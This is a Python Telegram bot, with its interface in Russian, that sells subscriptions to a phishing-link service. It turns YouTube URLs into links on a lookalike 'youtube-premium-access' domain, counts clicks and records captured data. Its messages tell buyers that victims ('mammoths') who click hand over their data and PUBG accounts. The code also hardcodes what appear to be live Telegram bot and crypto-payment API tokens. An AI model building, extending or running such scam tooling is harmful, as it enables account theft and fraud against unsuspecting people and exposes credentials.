import logging
import aiohttp
import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import datetime
import hashlib

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
API_TOKEN = '8514518192:AAFC2lbIxC8l2VgYUZVUA9Eb3izVWLG_-nY'
CRYPTO_PAY_TOKEN = '526811:AAatyx14fjIZ6GitsEvGO2CO72qBnNyHdIS'
ADMIN_ID = 8524326478

SUBSCRIPTION_PRICES = {
    'basic': 500,
    'pro': 1500,
    'premium': 5000
}

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

user_likes = {}
user_balances = {}
user_data_store = {}
user_purchases = {}
user_generated_links = {}
user_subscriptions = {}
pending_payments = {}

class UserStates(StatesGroup):
    waiting_for_youtube_url = State()
    waiting_for_amount = State()

async def create_crypto_invoice(amount_rub, description):
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "amount": str(amount_rub),
        "fiat": "RUB",
        "currency_type": "fiat",
        "accepted_assets": "USDT,TON,BTC,ETH,LTC,BNB",
        "description": description,
        "allow_comments": False,
        "expires_in": 3600
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data['result']['pay_url'], data['result']['invoice_id']
                return None, None
    except Exception as e:
        logging.error(f"Ошибка инвойс: {e}")
        return None, None

async def check_crypto_payment(invoice_id):
    url = f"https://pay.crypt.bot/api/getInvoices"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {"invoice_ids": invoice_id}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, params=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data['result']['items']:
                        return data['result']['items'][0]['status'] == 'paid'
                return False
    except Exception as e:
        logging.error(f"Ошибка проверки: {e}")
        return False

def generate_phishing_link(youtube_url, user_id):
    if user_id not in user_subscriptions:
        return None, "❌ Нет подписки!"
    
    subscription = user_subscriptions[user_id]
    expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
    if datetime.datetime.now() > expiry_date:
        return None, "❌ Подписка кончилась!"
    
    if subscription['links_used'] >= subscription['links_limit']:
        return None, f"❌ Лимит ({subscription['links_used']}/{subscription['links_limit']})!"
    
    unique_id = hashlib.md5(f"{youtube_url}{user_id}{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
    phishing_url = f"https://youtube-premium-access.com/watch/v={unique_id}"
    
    if user_id not in user_generated_links:
        user_generated_links[user_id] = []
    
    user_generated_links[user_id].append({
        'original': youtube_url,
        'phishing': phishing_url,
        'timestamp': datetime.datetime.now().strftime("%d.%m.%Y %H:%M"),
        'clicks': 0,
        'data_captured': []
    })
    
    subscription['links_used'] += 1
    return phishing_url, None

def get_image_path(filename):
    return os.path.join(BASE_DIR, filename)

async def send_photo_or_text(chat_id, image_filename, caption, reply_markup=None):
    try:
        full_path = get_image_path(image_filename)
        if os.path.exists(full_path):
            photo = FSInputFile(full_path)
            return await bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
    except Exception as e:
        logging.error(f"Ошибка фото: {e}")
    
    return await bot.send_message(
        chat_id=chat_id,
        text=caption,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def delete_and_send_photo(chat_id, message_id, photo_path, caption, markup=None):
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await send_photo_or_text(chat_id, photo_path, caption, markup)

def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text="🎬 Конвертер"),
                KeyboardButton(text="💰 Баланс")
            ],
            [
                KeyboardButton(text="👤 Кабинет"),
                KeyboardButton(text="💎 Подписки")
            ],
            [
                KeyboardButton(text="🛡️ Безопасность"),
                KeyboardButton(text="💬 Поддержка")
            ]
        ],
        resize_keyboard=True
    )
    return keyboard

def get_profile_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 Пополнить", callback_data="top_up_balance")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_profile")]
        ]
    )
    return keyboard

def get_payment_methods_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💎 CryptoBot", callback_data="payment_crypto")],
            [InlineKeyboardButton(text="💳 Картой (админ)", callback_data="payment_card")],
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_profile")]
        ]
    )
    return keyboard

def get_subscriptions_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"🎯 1 месяц - {SUBSCRIPTION_PRICES['basic']} ₽", callback_data="subscription_basic")],
            [InlineKeyboardButton(text=f"🚀 3 месяца - {SUBSCRIPTION_PRICES['pro']} ₽", callback_data="subscription_pro")],
            [InlineKeyboardButton(text=f"🏆 1 год - {SUBSCRIPTION_PRICES['premium']} ₽", callback_data="subscription_premium")],
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_converter_keyboard(user_id):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔄 Ссылку", callback_data="generate_link"),
                InlineKeyboardButton(text="💎 Подписки", callback_data="show_subscriptions")
            ],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_subscription_details_keyboard(subscription_type):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"💎 Купить CryptoBot", callback_data=f"buy_crypto_{subscription_type}")],
            [InlineKeyboardButton(text=f"💳 Картой (админ)", callback_data=f"buy_card_{subscription_type}")],
            [InlineKeyboardButton(text="« Назад", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_service_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 Поддержка", url="https://t.me/htttpspubg")]
        ]
    )
    return keyboard

def get_admin_payment_keyboard(subscription_type):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 Админу", url="https://t.me/htttpspubg")],
            [InlineKeyboardButton(text="« Назад", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

async def delete_and_send(chat_id, message_id, text, markup=None):
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')

def get_user_data(user_id):
    if user_id not in user_data_store:
        user_data_store[user_id] = {
            'name': f"Юзер #{user_id % 10000:04d}",
            'id': str(user_id),
            'balance': user_balances.get(user_id, 0),
            'reg_date': datetime.datetime.now().strftime("%d.%m.%Y"),
            'total_spent': 0,
            'purchases_count': 0,
            'total_links': 0,
            'successful_attacks': 0
        }
    return user_data_store[user_id]

def get_user_balance(user_id):
    return user_balances.get(user_id, 0)

def get_subscription_info(user_id):
    if user_id in user_subscriptions:
        subscription = user_subscriptions[user_id]
        expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
        days_left = (expiry_date - datetime.datetime.now()).days
        return {
            'type': subscription['type'],
            'expiry': subscription['expiry'],
            'days_left': max(0, days_left),
            'links_used': subscription['links_used'],
            'links_limit': subscription['links_limit']
        }
    return None

def format_bold_text(text):
    return f"<b>{text}</b>"

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    welcome_text = format_bold_text("""
🚀 Фишинг бот для ютуба

Кидаешь ссылку - получаешь фишинг
Жертва кликает - данные твои
Аккаунты PUBG твои

👇 Выбирай:
""")
    
    start_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🎬 Конвертер", callback_data="generate_link")],
            [InlineKeyboardButton(text="💎 Подписки", callback_data="show_subscriptions")]
        ]
    )
    
    await send_photo_or_text(message.chat.id, "photo1.png", welcome_text, start_keyboard)

@dp.message(lambda message: message.text == "👤 Кабинет")
async def handle_profile(message: types.Message):
    user_id = message.from_user.id
    user_data = get_user_data(user_id)
    balance = get_user_balance(user_id)
    subscription_info = get_subscription_info(user_id)
    
    profile_text = format_bold_text(f"""
👤 Кабинет

Юзер: {user_data['name']}
Баланс: {balance} ₽
""")
    
    if subscription_info:
        profile_text += format_bold_text(f"""
Подписка: {subscription_info['type']}
Дней: {subscription_info['days_left']}
Ссылок: {subscription_info['links_used']}/{subscription_info['links_limit']}
""")
    else:
        profile_text += format_bold_text("""
Подписка: ❌ Нет
Купи подписку для работы
""")
    
    await send_photo_or_text(message.chat.id, "photo2.png", profile_text, get_profile_keyboard())

@dp.message(lambda message: message.text == "💎 Подписки")
async def handle_subscriptions(message: types.Message):
    text = format_bold_text("""
💎 Подписки

🎯 1 месяц - 500 ₽
🚀 3 месяца - 1500 ₽
🏆 1 год - 5000 ₽

Выбирай:
""")
    
    await send_photo_or_text(message.chat.id, "photo3.png", text, get_subscriptions_keyboard())

@dp.message(lambda message: message.text == "🎬 Конвертер")
async def handle_youtube_converter(message: types.Message):
    user_id = message.from_user.id
    subscription_info = get_subscription_info(user_id)
    
    if not subscription_info:
        text = format_bold_text("""
❌ Нет подписки

Купи подписку для работы
""")
        await send_photo_or_text(message.chat.id, "photo3.png", text, get_subscriptions_keyboard())
        return
    
    text = format_bold_text(f"""
🎬 Конвертер

Кидаешь ютуб ссылку
Получаешь фишинг
Жертва кликает - данные твои
""")
    
    await send_photo_or_text(message.chat.id, "photo7.png", text, get_converter_keyboard(user_id))

@dp.message(lambda message: message.text == "🛡️ Безопасность")
async def handle_security(message: types.Message):
    security_text = format_bold_text("""
🛡️ Безопасно

Анонимно через крипту
Без логов
Шифрование
""")
    
    await send_photo_or_text(message.chat.id, "photo4.png", security_text)

@dp.message(lambda message: message.text == "💬 Поддержка")
async def handle_support(message: types.Message):
    support_text = format_bold_text("""
💬 Поддержка

Пиши: @htttpspubg
Отвечаем быстро
""")
    
    await send_photo_or_text(message.chat.id, "photo5.png", support_text, get_service_keyboard())

@dp.message(lambda message: message.text == "💰 Баланс")
async def handle_balance(message: types.Message):
    user_id = message.from_user.id
    balance = get_user_balance(user_id)
    
    balance_text = format_bold_text(f"""
💰 Баланс

Баланс: {balance} ₽
Пополняй в кабинете
""")
    
    await send_photo_or_text(message.chat.id, "photo6.png", balance_text)

@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_main')
async def back_to_main(callback_query: types.CallbackQuery):
    welcome_text = format_bold_text("""
🚀 Фишинг бот

Кидаешь ссылку - получаешь фишинг
Жертва кликает - данные твои
""")
    
    start_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🎬 Конвертер", callback_data="generate_link")],
            [InlineKeyboardButton(text="💎 Подписки", callback_data="show_subscriptions")]
        ]
    )
    
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo1.png", welcome_text, start_keyboard)
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_profile')
async def back_to_profile(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_data = get_user_data(user_id)
    balance = get_user_balance(user_id)
    subscription_info = get_subscription_info(user_id)
    
    profile_text = format_bold_text(f"""
👤 Кабинет

Юзер: {user_data['name']}
Баланс: {balance} ₽
""")
    
    if subscription_info:
        profile_text += format_bold_text(f"""
Подписка: {subscription_info['type']}
Дней: {subscription_info['days_left']}
Ссылок: {subscription_info['links_used']}/{subscription_info['links_limit']}
""")
    
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo2.png", profile_text, get_profile_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'show_subscriptions')
async def show_subscriptions(callback_query: types.CallbackQuery):
    text = format_bold_text("""
💎 Подписки

🎯 1 месяц - 500 ₽
🚀 3 месяца - 1500 ₽
🏆 1 год - 5000 ₽
""")
    
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo3.png", text, get_subscriptions_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('subscription_'))
async def subscription_details(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('subscription_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        
        names = {
            'basic': '🎯 1 месяц',
            'pro': '🚀 3 месяца',
            'premium': '🏆 1 год'
        }
        
        text = format_bold_text(f"""
{names[subscription_type]}

Цена: {price} ₽

Купить:
""")
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                             text, get_subscription_details_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_crypto_'))
async def buy_subscription_crypto(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('buy_crypto_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        user_id = callback_query.from_user.id
        
        await callback_query.answer("Счет создается...")
        
        description = f"Подписка {subscription_type} фишинг бот"
        pay_url, invoice_id = await create_crypto_invoice(price, description)
        
        if pay_url and invoice_id:
            pending_payments[user_id] = {
                'subscription_type': subscription_type,
                'invoice_id': invoice_id,
                'amount': price,
                'payment_method': 'crypto'
            }
            
            invoice_text = format_bold_text(f"""
✅ Счет создан

Сумма: {price} ₽
Подписка: {subscription_type}

Оплати:
""")
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="💳 Оплатить", url=pay_url)],
                    [InlineKeyboardButton(text="🔄 Проверить", callback_data=f"check_payment_{invoice_id}")],
                    [InlineKeyboardButton(text="« Назад", callback_data="show_subscriptions")]
                ]
            )
            
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo8.png", invoice_text, markup)
            
        else:
            await callback_query.answer("❌ Ошибка счета", show_alert=True)
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_card_'))
async def buy_subscription_card(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('buy_card_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        
        card_text = format_bold_text(f"""
💳 Картой

Сумма: {price} ₽
Подписка: {subscription_type}

Пиши админу @htttpspubg
Он даст реквизиты
""")
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                            card_text, get_admin_payment_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('check_payment_'))
async def check_payment(callback_query: types.CallbackQuery):
    invoice_id = callback_query.data.replace('check_payment_', '')
    user_id = callback_query.from_user.id
    
    if user_id in pending_payments and pending_payments[user_id]['invoice_id'] == invoice_id:
        is_paid = await check_crypto_payment(invoice_id)
        
        if is_paid:
            subscription_type = pending_payments[user_id]['subscription_type']
            
            if subscription_type == 'basic':
                days = 30
                links_limit = 100
            elif subscription_type == 'pro':
                days = 90
                links_limit = 500
            else:
                days = 365
                links_limit = 999999
            
            expiry_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
            
            user_subscriptions[user_id] = {
                'type': subscription_type,
                'expiry': expiry_date,
                'links_used': 0,
                'links_limit': links_limit
            }
            
            del pending_payments[user_id]
            
            success_text = format_bold_text(f"""
✅ Подписка активирована!

Тип: {subscription_type}
До: {expiry_date}

Работай:
""")
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="🎬 Создать ссылку", callback_data="generate_link")],
                    [InlineKeyboardButton(text="👤 Кабинет", callback_data="back_to_profile")]
                ]
            )
            
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo1.png", success_text, markup)
            
            await callback_query.answer("✅ Оплачено!", show_alert=True)
        else:
            await callback_query.answer("❌ Не оплачено", show_alert=True)
    else:
        await callback_query.answer("❌ Счет не найден", show_alert=True)

@dp.callback_query(lambda callback_query: callback_query.data == 'generate_link')
async def generate_link(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    subscription_info = get_subscription_info(user_id)
    
    if not subscription_info:
        text = format_bold_text("""
❌ Нет подписки

Купи подписку
""")
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                             text, get_subscriptions_keyboard())
        await callback_query.answer()
        return
    
    await dp.fsm.set_state(user_id, UserStates.waiting_for_youtube_url)
    
    text = format_bold_text(f"""
🎬 Создание фишинг ссылки

Подписка: {subscription_info['type']}
Ссылок: {subscription_info['links_used']}/{subscription_info['links_limit']}

Кидай ютуб ссылку:
""")
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                         text, get_back_keyboard())
    await callback_query.answer()

@dp.message(UserStates.waiting_for_youtube_url)
async def process_youtube_url(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    youtube_url = message.text.strip()
    
    await state.clear()
    
    if "youtube.com" in youtube_url or "youtu.be" in youtube_url:
        phishing_link, error = generate_phishing_link(youtube_url, user_id)
        
        if error:
            await message.answer(error, parse_mode='HTML')
            if "лимит" in error.lower() or "истекла" in error.lower():
                markup = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="💎 Обновить", callback_data="show_subscriptions")]
                    ]
                )
                await message.answer("Обнови подписку", reply_markup=markup, parse_mode='HTML')
            return
        
        user_data = get_user_data(user_id)
        user_data['total_links'] = user_data.get('total_links', 0) + 1
        subscription_info = get_subscription_info(user_id)
        
        response_text = format_bold_text(f"""
✅ Фишинг ссылка готова!

Оригинал: {youtube_url[:50]}...
Фишинг: {phishing_link}

Ссылок: {subscription_info['links_used']}/{subscription_info['links_limit']}

Кидай мамонту
""")
        
        await message.answer(response_text, parse_mode='HTML')
        
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🔄 Ещё", callback_data="generate_link"),
                    InlineKeyboardButton(text="📊 Мои ссылки", callback_data="my_phishing_links")
                ],
                [InlineKeyboardButton(text="💎 Подписки", callback_data="show_subscriptions")]
            ]
        )
        
        await message.answer("Ещё ссылку?", reply_markup=markup, parse_mode='HTML')
        
    else:
        await message.answer("""
❌ Не ютуб ссылка

Кидай типа: https://youtu.be/abc123
""", parse_mode='HTML')

@dp.callback_query(lambda callback_query: callback_query.data == 'my_phishing_links')
async def my_phishing_links(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    links = user_generated_links.get(user_id, [])
    
    if links:
        links_text = "🔗 Твои фишинг ссылки\n\n"
        for i, link in enumerate(links[-10:], 1):
            links_text += f"""
#{i} | {link['timestamp']}
Фишинг: {link['phishing']}
Кликов: {link['clicks']}
"""
    else:
        links_text = "Нет ссылок\nСоздай первую"
    
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔄 Новая", callback_data="generate_link"),
                InlineKeyboardButton(text="« Назад", callback_data="back_to_profile")
            ]
        ]
    )
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
                         links_text, markup)
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'top_up_balance')
async def top_up_balance(callback_query: types.CallbackQuery):
    await dp.fsm.set_state(callback_query.from_user.id, UserStates.waiting_for_amount)
    text = "Введи сумму от 500 ₽"
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
                         text)
    await callback_query.answer()

@dp.message(UserStates.waiting_for_amount)
async def process_top_up_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 500:
            await message.answer("❌ Мин 500 ₽")
            return
        elif amount > 100000:
            await message.answer("❌ Макс 100000 ₽")
            return
            
        await state.clear()
        
        text = f"Сумма: {amount:.0f} ₽\nВыбирай оплату:"
        await message.answer(text, reply_markup=get_payment_methods_keyboard(), parse_mode='HTML')
        
    except ValueError:
        await message.answer("❌ Только цифры")

@dp.callback_query(lambda callback_query: callback_query.data == 'payment_card')
async def process_payment_card(callback_query: types.CallbackQuery):
    await callback_query.answer("💳 Картой")
    
    text = f"""
💳 Картой

Пиши админу @htttpspubg
Твой ID: {callback_query.from_user.id}

Он даст реквизиты
Пополнят за 15 мин
"""
    
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 Админу", url="https://t.me/htttpspubg")],
            [InlineKeyboardButton(text="« Назад", callback_data="top_up_balance")]
        ]
    )
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
                         text, markup)

@dp.callback_query(lambda callback_query: callback_query.data == 'payment_crypto')
async def process_payment_crypto(callback_query: types.CallbackQuery):
    await callback_query.answer("💎 CryptoBot")
    text = "Оплачивай в CryptoBot"
    
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💎 CryptoBot", url="https://t.me/CryptoBot")],
            [InlineKeyboardButton(text="« Назад", callback_data="top_up_balance")]
        ]
    )
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
                         text, markup)

@dp.message()
async def handle_unknown(message: types.Message):
    unknown_text = "Используй кнопки меню"
    await message.answer(unknown_text, reply_markup=get_main_keyboard(), parse_mode='HTML')

async def main():
    required_images = ['photo1.png', 'photo2.png', 'photo3.png', 'photo4.png', 
                      'photo5.png', 'photo6.png', 'photo7.png', 'photo8.png']
    
    logging.info("Проверка картинок...")
    for img in required_images:
        img_path = get_image_path(img)
        if os.path.exists(img_path):
            logging.info(f"✓ {img} найден")
        else:
            logging.warning(f"✗ {img} нет")
    
    logging.info("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
